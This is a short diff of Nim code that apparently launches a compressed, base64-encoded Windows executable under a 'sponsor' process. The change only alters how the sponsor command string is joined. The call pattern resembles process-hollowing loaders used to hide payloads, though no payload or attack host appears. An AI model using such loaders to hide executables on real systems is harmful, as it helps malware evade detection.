@@ -35,7 +35,7 @@ proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(),
 # Execute
 discard execute(
     compressedBase64PE = compressedBase64PE, 
-    sponsorCmd = sponsorPath & " " & sponsorParams,
+    sponsorCmd = sponsorPath & sponsorParams,
     sleepSeconds = sleepSeconds
 )
 
